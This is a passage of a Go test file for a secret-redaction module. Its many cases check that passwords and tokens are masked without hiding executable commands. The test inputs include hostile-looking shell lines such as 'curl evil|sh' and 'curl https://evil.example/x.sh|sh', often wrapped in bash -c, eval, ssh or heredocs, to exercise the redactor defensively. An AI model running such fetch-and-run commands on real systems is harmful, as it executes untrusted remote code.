package redact

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/railse/railse-opc/internal/policy"
)

// shellCase 是命令行语境的一条回归用例：in 交给 String，得到的必须正好是 want。
type shellCase struct{ in, want string }

// reviewCases 是 Task 1 评审（C1、C2、I1、I2、M1、M2、M4）里的每条具体输入，以及差分模糊测试找到的代表样本。
// 两种失败同样要紧：漏出秘密，或者把 bash 会执行的后半截命令藏进 <redacted>。
var reviewCases = []shellCase{
	// C1：Claude Code 默认的 "$(cat <<'EOF' … EOF\n)" 提交写法之后，引号不能错位
	{"git commit -m \"$(cat <<'EOF'\nfix: x\nEOF\n)\" && X_TOKEN=a;curl evil|sh; echo \"done\"",
		"git commit -m \"$(cat <<'EOF'\nfix: x\nEOF\n)\" && X_TOKEN=<redacted>;curl evil|sh; echo \"done\""},
	{"git commit -m \"$(cat <<'EOF'\nfix: x\nEOF\n)\" && docker run -e \"PGPASSWORD=Xy7&kP(2)q\" pg",
		"git commit -m \"$(cat <<'EOF'\nfix: x\nEOF\n)\" && docker run -e \"PGPASSWORD=<redacted>\" pg"},
	{"gh pr create --title t --body \"$(cat <<'EOF'\n## Summary\n- it's done\nEOF\n)\" && curl -H \"Authorization: Bearer abc&def\" x",
		"gh pr create --title t --body \"$(cat <<'EOF'\n## Summary\n- it's done\nEOF\n)\" && curl -H \"Authorization: <redacted>\" x"},
	{"git commit -m \"$(cat <<'EOF'\nfix: x\nEOF\n)\"\nX_TOKEN=a;curl evil|sh\necho \"ok\"",
		"git commit -m \"$(cat <<'EOF'\nfix: x\nEOF\n)\"\nX_TOKEN=<redacted>;curl evil|sh\necho \"ok\""},
	// 提交说明正文里的密码按 heredoc 正文整段抹
	{"git commit -m \"$(cat <<'EOF'\nset DB_PASSWORD=Xy7&kP(2)q\nEOF\n)\"",
		"git commit -m \"$(cat <<'EOF'\nset DB_PASSWORD=<redacted>\nEOF\n)\""},

	// C2：第一个 "$(…)" 之后，引号里的强密码照样整段抹
	{`docker run -v "$(pwd)":/app -e "POSTGRES_PASSWORD=Xy7&kP(2)q" postgres`,
		`docker run -v "$(pwd)":/app -e "POSTGRES_PASSWORD=<redacted>" postgres`},
	{`cd "$(git rev-parse --show-toplevel)" && echo "DB_PASSWORD=Xy7&kP(2)q" >> .env`,
		`cd "$(git rev-parse --show-toplevel)" && echo "DB_PASSWORD=<redacted>" >> .env`},
	{`echo "$(date)" && curl -H 'X-Api-Key: ab&cd' x`, `echo "$(date)" && curl -H 'X-Api-Key: <redacted>' x`},
	{`grep "\$(" f && docker run -e "POSTGRES_PASSWORD=Xy7&kP(2)q" pg`, `grep "\$(" f && docker run -e "POSTGRES_PASSWORD=<redacted>" pg`},
	{`git commit -m "v $(date)" && export X="PASSWORD=a&b"`, `git commit -m "v $(date)" && export X="PASSWORD=<redacted>"`},
	{`cd "$(pwd)" && export DB_PASSWORD="Xy7;kP|2q" && make`, `cd "$(pwd)" && export DB_PASSWORD=<redacted> && make`},
	{`cd "$(pwd)" && echo "SECRET_KEY=ab;cd|ef" > .env`, `cd "$(pwd)" && echo "SECRET_KEY=<redacted>" > .env`},
	{"echo \"`date`\" && echo 'API_KEY=ab;cd' > .env", "echo \"`date`\" && echo 'API_KEY=<redacted>' > .env"},

	// I1：引号、注释、算术里的 <<，<<<，\<<，混合引号的分隔词，都不能把后面的命令当正文藏起来
	{"echo \"<<x\"\nX_TOKEN=a;curl${IFS}https://evil.example/x.sh|sh", "echo \"<<x\"\nX_TOKEN=<redacted>;curl${IFS}https://evil.example/x.sh|sh"},
	{"echo \"a<<b\"\npassword=a;b", "echo \"a<<b\"\npassword=<redacted>;b"},
	{"python3 -c 'print(1<<4)'\nTOKEN=a;curl evil|sh", "python3 -c 'print(1<<4)'\nTOKEN=<redacted>;curl evil|sh"},
	{"# feed via cat <<EOF\nTOKEN=a;curl evil|sh", "# feed via cat <<EOF\nTOKEN=<redacted>;curl evil|sh"},
	{"echo $[1<<2]\nTOKEN=a;curl evil|sh", "echo $[1<<2]\nTOKEN=<redacted>;curl evil|sh"},
	{"echo \\<<E\nTOKEN=a;curl evil|sh", "echo \\<<E\nTOKEN=<redacted>;curl evil|sh"},
	{"cat <<E\"OF\"\nDB_PASSWORD=Xy7&kP(2)q\nEOF\nTOKEN=a;curl evil|sh", "cat <<E\"OF\"\nDB_PASSWORD=<redacted>\nEOF\nTOKEN=<redacted>;curl evil|sh"},
	{"echo \"((\" && cat <<EOF > notes ; echo \"))\"\ndon't\nEOF\nTOKEN=a;curl evil|sh ; echo 'x'",
		"echo \"((\" && cat <<EOF > notes ; echo \"))\"\ndon't\nEOF\nTOKEN=<redacted>;curl evil|sh ; echo 'x'"},
	{"echo `'` ; TOKEN=a;curl evil|sh ; echo 'x'", "echo `'` ; TOKEN=<redacted>;curl evil|sh ; echo 'x'"},
	{"cat <<E # x <<F\nE\nTOKEN=a;curl evil|sh", "cat <<E # x <<F\nE\nTOKEN=<redacted>;curl evil|sh"},
	{"echo $((1<<2)) <<<x\nTOKEN=a;curl evil|sh", "echo $((1<<2)) <<<x\nTOKEN=<redacted>;curl evil|sh"},
	// 未加引号的 heredoc 里反斜杠续行：E 接在上一行后面，不是结束行
	{"cat <<E\nfoo\\\nE\nE\nTOKEN=a;curl evil|sh", "cat <<E\nfoo\\\nE\nE\nTOKEN=<redacted>;curl evil|sh"},
	// 差分模糊测试（/bin/bash 3.2 实测执行了 TOKEN=a;touch PWNED）在旧实现上找到的代表样本：旧实现把这一行藏进了 <redacted>
	{"#<<E\\\"\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "#<<E\\\"\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{" #<<-E\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", " #<<-E\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"$'<<E'echo \n\nTOKEN=a;touch PWNED ; echo 'q' \"q\"  <<-E", "$'<<E'echo \n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\"  <<-E"},
	{"}\\<<E\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "}\\<<E\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"$\"<<-E #$\"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "$\"<<-E #$\"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"\"))<<-E$\"{\nTOKEN=a;touch PWNED ; echo 'q' \"q\" {\n'", "\"))<<-E$\"{\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" {\n'"},
	{"`<<-E#\n` ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ;", "`<<-E#\n` ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" ;"},
	{" #(\"$( #<<-E\nTOKEN=a;touch PWNED ; echo 'q' \"q\"  #", " #(\"$( #<<-E\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\"  #"},
	{"{\\\"`$'` ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "{\\\"`$'` ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	// 分隔词里的反斜杠续行：分隔词是 ETOKEN=a，这一行后半截照样执行；分隔词原样保留
	{"<<E\\\nTOKEN=a;touch PWNED ; echo 'q' \"q\" \n", "<<E\\\nTOKEN=a;touch PWNED ; echo 'q' \"q\" \n"},
	// 同类写法，均经 bash 实测会执行
	{"'<<E'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "'<<E'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"echo `'`\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "echo `'`\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"$'\\'' ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "$'\\'' ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"${x:-'}'} ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "${x:-'}'} ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"\"$(echo ')')\" ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "\"$(echo ')')\" ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"(())#'\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ]", "(())#'\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" ]"},
	// 反引号里的 \\\\ 先变成 \\，里层看到的是 \\' 转义的引号；((…)) 里的引号照常配对
	{"`\\\\'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" `", "`\\\\'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" `"},
	{"(('))$'))\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" <<E", "(('))$'))\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" <<E"},
	{"echo a\\'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "echo a\\'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	// bash 不执行的（heredoc 正文、算术出错）：正文照旧按文本抹，算术里的 << 不是 heredoc，命令照样露出来
	{"\"\"<<E\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "\"\"<<E\n\nTOKEN=<redacted> PWNED ; echo 'q' \"q\" "},
	{"$((1<<E\n\nE\n)) ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "$((1<<E\n\nE\n)) ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	// case 分支的 ) 不结束 $(…)（bash 5 的解析；bash 3.2 在这里报语法错误、不执行），里面的命令按命令行语境露出来
	{"$(case a in a) echo;; esac) ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "$(case a in a) echo;; esac) ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"\"$(case a in a) TOKEN=a;touch PWNED;; esac)\"", "\"$(case a in a) TOKEN=<redacted>;touch PWNED;; esac)\""},

	// 修复过程中加大模糊测试（20 万条，另加 bash -c、eval、ssh、case、数组等原子）找到的写法，均经 /bin/bash 3.2 实测会执行：
	// 分隔词不带引号的 heredoc 正文会展开，其中的 $(…)、反引号会执行
	{"<<E\n\"$( #\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" \\\"))\"", "<<E\n\"$( #\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" \\\"))\""},
	{"cat <<E\n$(TOKEN=a;curl evil|sh)\nE", "cat <<E\n$(TOKEN=<redacted>;curl evil|sh)\nE"},
	{"cat <<E\n`TOKEN=a;curl evil|sh`\nE", "cat <<E\n`TOKEN=<redacted>;curl evil|sh`\nE"},
	{"cat <<E\nfoo $(cat <<F\nbar\nF\n) baz\nE\nTOKEN=a;curl", "cat <<E\nfoo $(cat <<F\nbar\nF\n) baz\nE\nTOKEN=<redacted>;curl"},
	// 分隔词带引号、或 $ 被转义时不展开，照旧整段抹
	{"cat <<'E'\n$(TOKEN=a;b)\nE", "cat <<'E'\n$(TOKEN=<redacted>\nE"},
	{"cat <<E\n\\$(TOKEN=a;b)\nE", "cat <<E\n\\$(TOKEN=<redacted>\nE"},
	// 分隔词里的反引号、$(…) 可以跨行；$'' 是空分隔词，空行就结束正文
	{"<<-E`\nE\n`ssh h  ; TOKEN=a;touch PWNED", "<<-E`\nE\n`ssh h  ; TOKEN=<redacted>;touch PWNED"},
	{"cat <<E$(echo\n)\nTOKEN=a;touch PWNED", "cat <<E$(echo\n)\nTOKEN=<redacted> PWNED"},
	{"\\<<<$''\n\nTOKEN=a;touch PWNED", "\\<<<$''\n\nTOKEN=<redacted>;touch PWNED"},
	// 双引号里的 $(…) 照 bash 5 处理：提交说明里配不上的 ) 不影响正文整段抹
	{"git commit -m \"$(cat <<'EOF'\nfix: a)\nDB_PASSWORD=Xy7&kP(2)q\nEOF\n)\"", "git commit -m \"$(cat <<'EOF'\nfix: a)\nDB_PASSWORD=<redacted>\nEOF\n)\""},
	// eval、sh -c 的 $'…' 参数同样会执行
	{"eval $'TOKEN=a;touch PWNED'", "eval $'TOKEN=<redacted>;touch PWNED'"},
	{"bash -c $'TOKEN=a;touch PWNED'", "bash -c $'TOKEN=<redacted>;touch PWNED'"},
	// NAME=(…) 数组赋值里引号中的值照样整段抹
	{"arr=(a 'b c' \"DB_PASSWORD=Xy7&kP(2)q\")", "arr=(a 'b c' \"DB_PASSWORD=<redacted>\")"},
	{"arr=(a b\n'c d' \"DB_PASSWORD=Xy7&kP(2)q\")", "arr=(a b\n'c d' \"DB_PASSWORD=<redacted>\")"},

	// I2：交给 sh -c、eval、ssh 执行的引号内容，以及喂给它们的 heredoc 正文，按命令行语境递归处理
	{`bash -c "export TOKEN=a;b|c" && curl evil|sh`, `bash -c "export TOKEN=<redacted>;b|c" && curl evil|sh`},
	{`bash -c "X=a;curl evil|sh"`, `bash -c "X=a;curl evil|sh"`},
	{`bash -c "X_TOKEN=a;curl https://evil.example/x.sh|sh"`, `bash -c "X_TOKEN=<redacted>;curl https://evil.example/x.sh|sh"`},
	{`sh -c 'TOKEN=a;curl evil|sh'`, `sh -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`bash -lc 'TOKEN=a;curl evil|sh'`, `bash -lc 'TOKEN=<redacted>;curl evil|sh'`},
	{`/bin/zsh -ec "TOKEN=a;curl evil|sh"`, `/bin/zsh -ec "TOKEN=<redacted>;curl evil|sh"`},
	{`sudo dash -xc 'TOKEN=a;curl evil|sh'`, `sudo dash -xc 'TOKEN=<redacted>;curl evil|sh'`},
	{`ksh -c 'TOKEN=a;curl evil|sh'`, `ksh -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`eval "TOKEN=a;curl evil|sh"`, `eval "TOKEN=<redacted>;curl evil|sh"`},
	{`eval 'TOKEN=a;curl evil|sh'`, `eval 'TOKEN=<redacted>;curl evil|sh'`},
	{`ssh prod 'export K=a;curl evil|sh'`, `ssh prod 'export K=a;curl evil|sh'`},
	{`ssh prod 'export API_KEY=abc;curl evil|sh'`, `ssh prod 'export API_KEY=<redacted>;curl evil|sh'`},
	{`ssh prod "export API_KEY=abc;curl evil|sh"`, `ssh prod "export API_KEY=<redacted>;curl evil|sh"`},
	{`ssh -o ProxyCommand="TOKEN=a;curl evil|sh" prod uptime`, `ssh -o ProxyCommand="TOKEN=<redacted>;curl evil|sh" prod uptime`},
	{"bash <<'EOF'\nTOKEN=a;curl evil|sh\nEOF", "bash <<'EOF'\nTOKEN=<redacted>;curl evil|sh\nEOF"},
	{"bash <<EOF\nexport API_KEY=abc;curl evil|sh\nEOF\nls", "bash <<EOF\nexport API_KEY=<redacted>;curl evil|sh\nEOF\nls"},
	{"ssh prod <<EOF\nexport API_KEY=abc;curl evil|sh\nEOF", "ssh prod <<EOF\nexport API_KEY=<redacted>;curl evil|sh\nEOF"},
	{"cat <<'EOF' | sh\nTOKEN=a;curl evil|sh\nEOF", "cat <<'EOF' | sh\nTOKEN=<redacted>;curl evil|sh\nEOF"},
	// 分隔词不带引号时，shell 读到的是外层展开后的正文：\\" 是转义的引号，不开始双引号
	{"sh <<E\n\\\\\"| sh  ; TOKEN=a;touch PWNED ; echo 'q' \"q\" \\\n", "sh <<E\n\\\\\"| sh  ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" \\\n"},
	// 喂给 shell 的 here-string 同样会执行
	{"bash <<< 'TOKEN=a;curl evil|sh'", "bash <<< 'TOKEN=<redacted>;curl evil|sh'"},
	{"sh <<E<<<TOKEN='\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" \\'", "sh <<E<<<TOKEN='\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" \\'"},
	{"cat <<< 'TOKEN=a;b|c'", "cat <<< 'TOKEN=<redacted>'"},
	// 递归时引号里的值照样整段抹，转义的双引号也不例外
	{`bash -c "PGPASSWORD=\"Xy7&kP(2)q\" psql"`, `bash -c "PGPASSWORD=<redacted> psql"`},
	{`bash -c 'docker run -e "POSTGRES_PASSWORD=Xy7&kP(2)q" pg'`, `bash -c 'docker run -e "POSTGRES_PASSWORD=<redacted>" pg'`},
	{`ssh prod "echo 'SECRET_KEY=ab;cd|ef' > .env"`, `ssh prod "echo 'SECRET_KEY=<redacted>' > .env"`},
	{"bash <<'EOF'\necho \"DB_PASSWORD=Xy7&kP(2)q\" > .env\nEOF", "bash <<'EOF'\necho \"DB_PASSWORD=<redacted>\" > .env\nEOF"},
	// 不是交给解释器的引号和 heredoc 照旧整段抹
	{`python3 -c "TOKEN=a;b|c"`, `python3 -c "TOKEN=<redacted>"`},
	{`echo "TOKEN=a;b|c"`, `echo "TOKEN=<redacted>"`},
	{"cat > .env <<EOF && bash setup.sh\nDB_PASSWORD=Xy7&kP(2)q\nEOF", "cat > .env <<EOF && bash setup.sh\nDB_PASSWORD=<redacted>\nEOF"},

	// M1：heredoc 分隔词与结束行从不脱敏，hub 二次脱敏不变
	{"cat <<TOKEN=abc\nhello\nTOKEN=abc\nX_TOKEN=a;curl evil|sh", "cat <<TOKEN=abc\nhello\nTOKEN=abc\nX_TOKEN=<redacted>;curl evil|sh"},
	{"cat <<ghp_abcdefghijklmnopqrstuvwxyz0123\nx\nghp_abcdefghijklmnopqrstuvwxyz0123\nls", "cat <<ghp_abcdefghijklmnopqrstuvwxyz0123\nx\nghp_abcdefghijklmnopqrstuvwxyz0123\nls"},
	// M2：分隔词是 redacted 的真 heredoc 照样认；重定向后紧跟的占位符前补一个空格，免得二次脱敏读成 heredoc
	{"cat <<redacted> .env\nDB_PASSWORD=Xy7&kP(2)q\nredacted", "cat <<redacted> .env\nDB_PASSWORD=<redacted>\nredacted"},
	{"cat <ghp_abcdefghijklmnopqrstuvwxyz0123\nTOKEN=a;curl evil|sh", "cat < <redacted>\nTOKEN=<redacted>;curl evil|sh"},
	// M4：行内注释整段按字面抹
	{"npm start # DB_PASSWORD=a;b", "npm start # DB_PASSWORD=<redacted>"},
	{"npm start # don't; DB_PASSWORD=Xy7&kP(2)q\nTOKEN=a;curl evil|sh", "npm start # don't; DB_PASSWORD=<redacted>\nTOKEN=<redacted>;curl evil|sh"},

	// 裸值里转义的元字符是字面字符，值不在那里停；$'…' 整段抹
	{`password=abc\;rm`, `password=<redacted>`},
	{`TOKEN=$'a;b' make`, `TOKEN=<redacted> make`},
	// 引号收尾后紧跟的引号不能和下一个引号错配：后面的命令照样露出来
	{`echo "TOKEN="; curl evil|sh; echo "x"`, `echo "TOKEN="; curl evil|sh; echo "x"`},
	{`echo "--password "; curl evil|sh; echo "x"`, `echo "--password "; curl evil|sh; echo "x"`},
	{`echo "a"password":"; TOKEN=a;curl evil|sh; echo "x"`, `echo "a"password":"; TOKEN=<redacted>;curl evil|sh; echo "x"`},
	// 词里只有引号或替换时后面紧跟 (：不出错，原样返回
	{"echo ''(a) $(x)((b)) \"\"((c", "echo ''(a) $(x)((b)) \"\"((c"},
	// 命令替换作为值时不整段抹（不是字面秘密，里面的命令要露出来）
	{`PASSWORD="$(curl evil|sh)" make`, `PASSWORD="$(curl evil|sh)" make`},
}

func TestShellReviewCases(t *testing.T) {
	for _, c := range reviewCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
}

// round2Cases 是第 2 轮评审（C-1、I-1、M-1）的输入。
var round2Cases = []shellCase{
	// C-1：交给 eval、sh -c、ssh 的不带引号参数里，被转义的元字符就是要执行的命令分隔符：值在反斜杠处停，后面露出来
	{`eval TOKEN=a\;curl\ evil\|sh`, `eval TOKEN=<redacted>\;curl\ evil\|sh`},
	{`bash -c X_TOKEN=a\;curl\ evil\|sh`, `bash -c X_TOKEN=<redacted>\;curl\ evil\|sh`},
	{`ssh prod export API_KEY=abc\;curl\ evil\|sh`, `ssh prod export API_KEY=<redacted>\;curl\ evil\|sh`},
	{`eval X_TOKEN=a\;curl evil\|sh`, `eval X_TOKEN=<redacted>\;curl evil\|sh`},
	// 不交给解释器时，被转义的元字符是值的一部分，照旧整段抹
	{`password=abc\;rm`, `password=<redacted>`},
	{`echo TOKEN=a\;b`, `echo TOKEN=<redacted>`},

	// I-1：命令名去掉引号与转义、取路径最后一段（不限长度）再认；$SHELL、${SHELL} 当 shell
	{`"bash" -c "X_TOKEN=a;curl evil|sh"`, `"bash" -c "X_TOKEN=<redacted>;curl evil|sh"`},
	{`$'bash' -c "X_TOKEN=a;curl evil|sh"`, `$'bash' -c "X_TOKEN=<redacted>;curl evil|sh"`},
	{`ba"sh" -c "X_TOKEN=a;curl evil|sh"`, `ba"sh" -c "X_TOKEN=<redacted>;curl evil|sh"`},
	{`ba\sh -c 'X_TOKEN=a;curl evil|sh'`, `ba\sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
	{`$SHELL -c "X_TOKEN=a;curl evil|sh"`, `$SHELL -c "X_TOKEN=<redacted>;curl evil|sh"`},
	{`${SHELL} -lc "X_TOKEN=a;curl evil|sh"`, `${SHELL} -lc "X_TOKEN=<redacted>;curl evil|sh"`},
	{`"$SHELL" -c 'X_TOKEN=a;curl evil|sh'`, `"$SHELL" -c 'X_TOKEN=<redacted>;curl evil|sh'`},
	{`"eval" "X_TOKEN=a;curl evil|sh"`, `"eval" "X_TOKEN=<redacted>;curl evil|sh"`},
	{`"ssh" prod "X_TOKEN=a;curl evil|sh"`, `"ssh" prod "X_TOKEN=<redacted>;curl evil|sh"`},
	{"cat <<EOF | \"bash\"\nX_TOKEN=a;curl evil|sh\nEOF", "cat <<EOF | \"bash\"\nX_TOKEN=<redacted>;curl evil|sh\nEOF"},
	{"\"bash\" <<'EOF'\nX_TOKEN=a;curl evil|sh\nEOF", "\"bash\" <<'EOF'\nX_TOKEN=<redacted>;curl evil|sh\nEOF"},
	{`././././././././././././././././././././././././././././././././././././././././bin/bash -c "X_TOKEN=a;curl evil|sh"`, `././././././././././././././././././././././././././././././././././././././././bin/bash -c "X_TOKEN=<redacted>;curl evil|sh"`},

	// M-1：只认命令位置上的 shell、eval、ssh（命令开头、VAR=值 之后、包装命令及其选项之后）；参数里出现的不算
	{`echo ssh 'PASSWORD=Xy7;kP|2q'`, `echo ssh 'PASSWORD=<redacted>'`},
	{`git log --grep eval -S "PASSWORD=Xy7&kP(2)q"`, `git log --grep eval -S "PASSWORD=<redacted>"`},
	// 不带 -c 的 shell 名出现在参数里不算
	{`echo bash 'PASSWORD=Xy7;kP|2q'`, `echo bash 'PASSWORD=<redacted>'`},
	{`grep bash x.txt -c 'PASSWORD=Xy7;kP|2q'`, `grep bash x.txt -c 'PASSWORD=<redacted>'`},
	{`grep -r ssh . | xargs echo 'PASSWORD=Xy7;kP|2q'`, `grep -r ssh . | xargs echo 'PASSWORD=<redacted>'`},
	// shell 名后面（隔着它自己的选项）跟着含 c 的选项组合，在命令里任何位置都算交给解释器：agent 常用 docker exec、kubectl exec
	{`docker exec ctr sh -c "X_TOKEN=a;curl evil|sh"`, `docker exec ctr sh -c "X_TOKEN=<redacted>;curl evil|sh"`},
	{`docker run --rm img bash -lc 'X_TOKEN=a;curl evil|sh'`, `docker run --rm img bash -lc 'X_TOKEN=<redacted>;curl evil|sh'`},
	{`kubectl exec pod -- sh -c 'X_TOKEN=a;curl evil|sh'`, `kubectl exec pod -- sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
	{`sudo -u x bash -c 'X_TOKEN=a;curl evil|sh'`, `sudo -u x bash -c 'X_TOKEN=<redacted>;curl evil|sh'`},
	{`nsenter -t 1 -m -u -n sh -c 'X_TOKEN=a;curl evil|sh'`, `nsenter -t 1 -m -u -n sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
	{`docker exec -i ctr /bin/bash -o pipefail -c "X_TOKEN=a;curl evil|sh"`, `docker exec -i ctr /bin/bash -o pipefail -c "X_TOKEN=<redacted>;curl evil|sh"`},
	{`echo bash -c "TOKEN=a;b|c"`, `echo bash -c "TOKEN=<redacted>;b|c"`},
	// 参数位置上的 shell 名同样接收 heredoc 正文：往容器里送多行脚本的常用写法
	{"docker exec -i ctr sh <<EOF\nTOKEN=a;echo hi\nEOF", "docker exec -i ctr sh <<EOF\nTOKEN=<redacted>;echo hi\nEOF"},
	{"kubectl exec -i pod -- sh <<EOF\nTOKEN=a;echo hi\nEOF", "kubectl exec -i pod -- sh <<EOF\nTOKEN=<redacted>;echo hi\nEOF"},
	{"docker run -i img bash <<'EOF'\nTOKEN=a;echo hi\nEOF", "docker run -i img bash <<'EOF'\nTOKEN=<redacted>;echo hi\nEOF"},
	// 已知误认（与 grep bash -c 同类）：shell 名只是别的命令的参数时，heredoc 正文也按命令行语境处理，强密码只抹到元字符
	{"echo bash <<EOF\nDB_PASSWORD=Xy7&kP(2)q\nEOF", "echo bash <<EOF\nDB_PASSWORD=<redacted>&kP(2)q\nEOF"},
	// 包装命令及其选项之后仍认
	{`sudo -u root bash -lc 'TOKEN=a;curl evil|sh'`, `sudo -u root bash -lc 'TOKEN=<redacted>;curl evil|sh'`},
	{`timeout 10 bash -c 'TOKEN=a;curl evil|sh'`, `timeout 10 bash -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`timeout -s KILL 10 sh -c 'TOKEN=a;curl evil|sh'`, `timeout -s KILL 10 sh -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`env -i PATH=/bin bash -c 'TOKEN=a;curl evil|sh'`, `env -i PATH=/bin bash -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`X=1 nohup sh -c 'TOKEN=a;curl evil|sh'`, `X=1 nohup sh -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`nice -n 5 bash -c 'TOKEN=a;curl evil|sh'`, `nice -n 5 bash -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`exec bash -c 'TOKEN=a;curl evil|sh'`, `exec bash -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`ls | xargs -I {} sh -c 'TOKEN=a;curl evil|sh'`, `ls | xargs -I {} sh -c 'TOKEN=<redacted>;curl evil|sh'`},
	{`find . -name x -exec sh -c 'TOKEN=a;curl evil|sh' \;`, `find . -name x -exec sh -c 'TOKEN=<redacted>;curl evil|sh' \;`},
	{`command eval 'TOKEN=a;curl evil|sh'`, `command eval 'TOKEN=<redacted>;curl evil|sh'`},
	{`builtin eval "TOKEN=a;curl evil|sh"`, `builtin eval "TOKEN=<redacted>;curl evil|sh"`},
	{`if bash -c 'TOKEN=a;curl evil|sh'; then :; fi`, `if bash -c 'TOKEN=<redacted>;curl evil|sh'; then :; fi`},
	{`(cd x && sudo env FOO=1 bash -c 'TOKEN=a;curl evil|sh')`, `(cd x && sudo env FOO=1 bash -c 'TOKEN=<redacted>;curl evil|sh')`},
	// eval 的参数本身也是一条命令：eval sh <<E 的正文喂给 sh；命令名里的参数展开不算进名字（${x:-}sh 是 sh）
	{"eval sh <<E\nTOKEN=a;curl evil|sh\nE", "eval sh <<E\nTOKEN=<redacted>;curl evil|sh\nE"},
	{"${x:-}sh <<E\nTOKEN=a;curl evil|sh\nE", "${x:-}sh <<E\nTOKEN=<redacted>;curl evil|sh\nE"},
	{"${x}bash -c 'TOKEN=a;curl evil|sh'", "${x}bash -c 'TOKEN=<redacted>;curl evil|sh'"},
	{"\"${SHELL}\" -c 'TOKEN=a;curl evil|sh'", "\"${SHELL}\" -c 'TOKEN=<redacted>;curl evil|sh'"},
	// 保留字只认不带引号、不带路径的原词：/case、"case" 不是 case，其后的 ) 照常结束 $(…)
	{"}\"$(/case a in a) \"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "}\"$(/case a in a) \"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
	{"echo \"$(\"case\" a in a) \"\nTOKEN=a;curl evil|sh", "echo \"$(\"case\" a in a) \"\nTOKEN=<redacted>;curl evil|sh"},
	// 递归的双引号参数里，右引号是 \" 两个字节：反斜杠不能被算进前面的值，否则结果里的引号结构变了，hub 二次脱敏时会错位
	{`bash -c "curl -H \"Authorization: Bearer abc&def\" x" && TOKEN=a;curl evil|sh`, `bash -c "curl -H \"Authorization: <redacted>\" x" && TOKEN=<redacted>;curl evil|sh`},
	{`bash -c "export TOKEN=\"abc\"" && TOKEN=a;curl evil|sh`, `bash -c "export TOKEN=<redacted>" && TOKEN=<redacted>;curl evil|sh`},
}

func TestShellRound2Cases(t *testing.T) {
	for _, c := range round2Cases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
}

// M-2：值位置上的 <redacted> 只有后面紧跟空白、引号或文本结尾时才只认占位符本身；后面还连着别的字符时，
// 整段（含后面的字符）照原来的字符类抹掉。
func TestPlaceholderFollowedBySecret(t *testing.T) {
	if got := Payload(policy.Payload{Type: policy.PayloadFileWrite, Path: "/x/password=<redacted>RealSecret"}).Path; got != "/x/password=<redacted>" {
		t.Errorf("Path 得到 %q", got)
	}
	out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(`{"content":"password=<redacted>RealSecret x"}`)})
	if string(out.Args) != `{"content":"password=<redacted> x"}` {
		t.Errorf("Args 得到 %s", out.Args)
	}
	if got := Text("password=<redacted>RealSecret"); got != "password=<redacted>" {
		t.Errorf("Text 得到 %q", got)
	}
	for _, c := range []shellCase{
		{"cat <<'EOF'\npassword=<redacted>RealSecret\nEOF", "cat <<'EOF'\npassword=<redacted>\nEOF"},
